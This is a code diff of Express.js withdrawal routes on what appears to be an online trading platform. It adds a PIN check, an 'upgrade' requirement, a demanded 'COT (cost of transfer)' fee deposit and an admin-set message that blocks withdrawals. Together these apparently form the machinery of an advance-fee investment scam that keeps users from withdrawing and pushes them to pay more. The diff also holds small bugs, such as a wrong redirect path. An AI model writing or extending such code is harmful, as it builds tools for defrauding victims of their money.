@@ -132,8 +132,8 @@ router.get("/metatrader", ensureAuthenticated, (req,res) => {
 
 router.post("/withdrawal/wire", ensureAuthenticated, async (req,res) => {
     try{
-        const {amount, method} = req.body;
-        if(!amount || !method){
+        const {amount, method, pin} = req.body;
+        if(!amount || !method || !pin){
             req.flash("error_msg", "Please enter all fields to withdraw");
             return res.redirect("/withdrawal/wire");
         }
@@ -146,11 +146,23 @@ router.post("/withdrawal/wire", ensureAuthenticated, async (req,res) => {
             return res.redirect("/withdrawal/wire");
         }
         if(req.user.verify_status !== 'verified'){
-            req.flash("error_msg", "Your account must be verified to make withdrawer.");
+            req.flash("error_msg", "Your account must be verified to make withdrawer. contact support for more info");
             return res.redirect("/withdrawal/wire");   
         }
+        if(!req.user.upgraded){
+            req.flash("error_msg", "Your account is not eligible for withdrawal, you must be upgrade your account to make withdrawer. contact support for more info");
+            return res.redirect("/withdrawal/wire");   
+        }
+        if(pin !== req.user.pin){
+            req.flash("error_msg", "Incorrect withdrawal PIN");
+            return res.redirect("/withdrawal/wire"); 
+        }
         if(req.user.debt > 0){
-            req.flash("error_msg", "You have to deposit a COT(cost of transafer) fee $" + req.user.debt +" in order to withdraw funds.");
+            req.flash("error_msg", "You have to deposit a COT(cost of transafer) fee $" + req.user.debt + " in order to withdraw funds.");
+            return res.redirect("/withdrawal/wire");
+        }
+        if(req.user.defaultMessage){
+            req.flash("error_msg", req.user.defaultMessage);
             return res.redirect("/withdrawal/wire");
         }
         else{
@@ -176,7 +188,7 @@ router.post("/withdrawal/wire", ensureAuthenticated, async (req,res) => {
 
 router.post("/withdrawal/btc", ensureAuthenticated, async (req,res) => {
     try{
-        const {amount, method} = req.body;
+        const {amount, method, pin} = req.body;
         if(!amount || !method){
             req.flash("error_msg", "Please enter all fields to withdraw");
             return res.redirect("/withdrawal/btc");
@@ -190,11 +202,23 @@ router.post("/withdrawal/btc", ensureAuthenticated, async (req,res) => {
             return res.redirect("/withdrawal/btc");
         }
         if(req.user.verify_status !== 'verified'){
-            req.flash("error_msg", "Your account must be verified to make withdrawer.");
+            req.flash("error_msg", "Your account must be verified to make withdrawer. contact support for more info");
             return res.redirect("/withdrawal/btc");   
         }
+        if(!req.user.upgraded){
+            req.flash("error_msg", "Your account is not eligible for withdrawal, you must be upgrade your account to make withdrawer. contact support for more info");
+            return res.redirect("/withdrawal/btc");   
+        }
+        if(pin !== req.user.pin){
+            req.flash("error_msg", "Incorrect withdrawal PIN");
+            return res.redirect("/withdrawal/btc"); 
+        }
         if(req.user.debt > 0){
-            req.flash("error_msg", "You have to deposit a COT(cost of transafer) fee $" + req.user.debt +" in order to withdraw funds.");
+            req.flash("error_msg", "You have to deposit a COT(cost of transafer) fee $" + req.user.debt + " in order to withdraw funds.");
+            return res.redirect("/withdrawal/btc");
+        }
+        if(req.user.defaultMessage){
+            req.flash("error_msg", req.user.defaultMessage);
             return res.redirect("/withdrawal/btc");
         }
         else{
@@ -220,7 +244,7 @@ router.post("/withdrawal/btc", ensureAuthenticated, async (req,res) => {
 
 router.post("/withdrawal/pm", ensureAuthenticated, async (req,res) => {
     try{
-        const {amount, method} = req.body;
+        const {amount, method, pin} = req.body;
         if(!amount || !method){
             req.flash("error_msg", "Please enter all fields to withdraw");
             return res.redirect("/withdrawal/pm");
@@ -234,12 +258,24 @@ router.post("/withdrawal/pm", ensureAuthenticated, async (req,res) => {
             return res.redirect("/withdrawal/pm");
         }
         if(req.user.verify_status !== 'verified'){
-            req.flash("error_msg", "Your account must be verified to make withdrawer.");
+            req.flash("error_msg", "Your account must be verified to make withdrawer. contact support for more info");
             return res.redirect("/withdrawal/pm");   
         }
+        if(!req.user.upgraded){
+            req.flash("error_msg", "Your account is not eligible for withdrawal, you must be upgrade your account to make withdrawer. contact support for more info");
+            return res.redirect("/withdrawal/pm");   
+        }
+        if(pin !== req.user.pin){
+            req.flash("error_msg", "Incorrect withdrawal PIN");
+            return res.redirect("/withdrawal/pm"); 
+        }
         if(req.user.debt > 0){
-            req.flash("error_msg", "You have to deposit a COT(cost of transafer) fee $" + req.user.debt +" in order to withdraw funds.");
+            req.flash("error_msg", "You have to deposit a COT(cost of transafer) fee $" + req.user.debt + " in order to withdraw funds.");
             return res.redirect("/withdrawal/pm");
+        }
+        if(req.user.defaultMessage){
+            req.flash("error_msg", req.user.defaultMessage);
+            return res.redirect("/withdrawal/wire");
         }
         else{
             const newHist = {
